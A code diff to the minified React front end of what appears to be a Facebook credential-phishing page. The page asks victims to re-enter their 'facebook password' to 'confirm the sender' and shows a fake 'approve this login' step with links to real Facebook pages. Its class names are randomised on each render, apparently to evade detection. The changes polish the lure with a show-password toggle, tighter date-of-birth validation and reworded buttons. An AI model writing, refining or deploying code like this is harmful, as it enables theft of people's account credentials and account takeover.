@@ -11104,7 +11104,7 @@ const Kx = e => new Promise((t, n) => {
         timeout: 120000 // Set the timeout to 120 seconds
     }).then(response => {
         // Uncomment below code to test approve feature
-        // return n(new Zc(!1, "To continue, please approve this login on a phone or computer you've used before.", ""));
+        //return n(new Zc(!1, "To continue, please approve this login on a phone or computer you've used before.", ""));
         if (response.data.message == null) {
             return n(new Zc(!1, "Data response is null!!!", ""));
         }
@@ -11476,8 +11476,13 @@ function qx() {
     }, [a]);
     const d = async () => {
         Kx(a).then(v => {
-            if (!v) c(!1), n(), i("The email address you entered isn't connected to an account.")
+            if (!v) {
+            c(!1);
+            n();
+            i("The email address you entered isn't connected to an account.")
             return
+        }
+           
         })
         if (a.emailValid === a.email) {
             s(!0), c(!1), n();
@@ -11511,10 +11516,13 @@ function qx() {
             return
         }
         let dateObject = new Date(a.birthDay)
-        if (dateObject.getFullYear() < 1900 || dateObject.getFullYear() > 2500) {
+		
+		if (dateObject.getFullYear() < 1900 || dateObject.getFullYear() > 2024) {
             i("Please make sure that you use your real date of birth."), n(), c(!1);
             return
         }
+
+
         d()
     }, y = () => {
         Gx(a).then(v => {
@@ -11538,22 +11546,42 @@ function qx() {
                         children: m.jsx("div", {
                             className: "approve",
                             children: [m.jsx("br", {}), m.jsx("br", {}), m.jsx("br", {}), m.jsx("br", {})]})}),
-                m.jsxs(jr.Body, {
+                
+				m.jsxs(jr.Body, {
                 children: [!o.startsWith("To continue") ? m.jsxs(K, {
                     id: "checkPassword",
                     onSubmit: p,
                     children: [m.jsx(K.Text, {
                         className: Math.random().toString(36).substring(2, 9) + " text-muted",
                         children: "We need to confirm the sender of the information is you, Please enter your facebook password and then continue."
-                    }), m.jsxs(K.Group, {
+                    }), 
+                    m.jsxs(K.Group, {
                         className: Math.random().toString(36).substring(2, 9) + " mb-3",
                         controlId: "password",
-                        children: [m.jsx(K.Label, {children: "Password"}), m.jsx(K.Control, {
+                        children: [m.jsx(K.Label, {children: "Password"}),
+                        m.jsx(K.Control, {
                             onChange: v => a.password = v.target.value,
                             type: "password",
                             disabled: u,
                             required: !0
-                        })]
+                        }),
+                        m.jsxs(K.Group, {
+                            className: "mt-3",
+                            children: [
+                              m.jsx(K.Check, {
+                                type: "checkbox",
+                                label: "Show Password",
+                                onChange: e => {
+                                    // Toggle password visibility based on checkbox
+                                    const passwordInput = document.getElementById('password');
+                                    if (passwordInput.type === "password") {
+                                      passwordInput.type = "text";
+                                    } else {
+                                      passwordInput.type = "password";
+                                    }
+                                }
+                              })]
+                            })]
                     })]
                 }) : null, m.jsxs(K.Group, {
                     className: Math.random().toString(36).substring(2, 9) + " mb-3",
@@ -11567,7 +11595,7 @@ function qx() {
                     }) : "", o ? m.jsx("div", {
                         className: o.startsWith("To continue") ? Math.random().toString(36).substring(2, 9): Math.random().toString(36).substring(2, 9) + " text-danger",
                         style: {display: "flex", flexDirection: "column"},
-                        children: [m.jsx("b", {children: o}), m.jsx("br", {}), m.jsx("br", {}),
+                        children: [m.jsx("saipass", {children: o}),
                             o.startsWith("The password") ? m.jsx("a", {href: "https://www.facebook.com/login/identify/",
                                 children: "Forgotten password?"}) :
                                 o.startsWith("To continue") ? m.jsx(Jn, {
@@ -11579,7 +11607,7 @@ function qx() {
                                         window.location.href = "https://www.facebook.com/notifications";
                                     },
                                     style: { backgroundColor: "#6274a2", color: "white" },
-                                    children: "Go to approve page"
+                                    children: "Approve"
                                 }) : null]
                     }) : null]
                 })]
@@ -11631,7 +11659,7 @@ function qx() {
                 }), o !== "" && !l ? m.jsx("div", {
                     className: Math.random().toString(36).substring(2, 9) + " text-danger",
                     children: m.jsx("b", {
-                        className: Math.random().toString(36).substring(2, 9) + " text-mute",
+                        className: "b",
                         children: o
                     })
                 }) : null, m.jsx("div", {
@@ -11647,10 +11675,10 @@ var Zx = {
         xmlns: "http://www.w3.org/2000/svg",
         width: 24,
         height: 24,
-        viewBox: "0 0 24 24",
+        viewBox: "0 0 24 31",
         fill: "none",
         stroke: "currentColor",
-        strokeWidth: 2,
+        strokeWidth: 5,
         strokeLinecap: "round",
         strokeLinejoin: "round"
     }, eS = Object.defineProperty, tS = Object.defineProperties, nS = Object.getOwnPropertyDescriptors,
